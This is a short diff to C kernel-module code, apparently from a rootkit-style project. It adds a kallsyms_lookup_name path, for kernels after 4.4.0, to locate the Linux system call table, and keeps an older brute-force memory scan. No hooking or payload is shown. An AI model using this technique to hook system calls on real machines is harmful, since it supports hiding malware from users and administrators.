@@ -37,6 +37,11 @@ unsigned long *
 get_syscall_table_bf(void)
 {
 	unsigned long *syscall_table;
+	
+#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 4, 0)
+	syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
+	return syscall_table;
+#else
 	unsigned long int i;
 
 	for (i = (unsigned long int)sys_close; i < ULONG_MAX;
@@ -47,6 +52,7 @@ get_syscall_table_bf(void)
 			return syscall_table;
 	}
 	return NULL;
+#endif
 }
 
 struct task_struct *
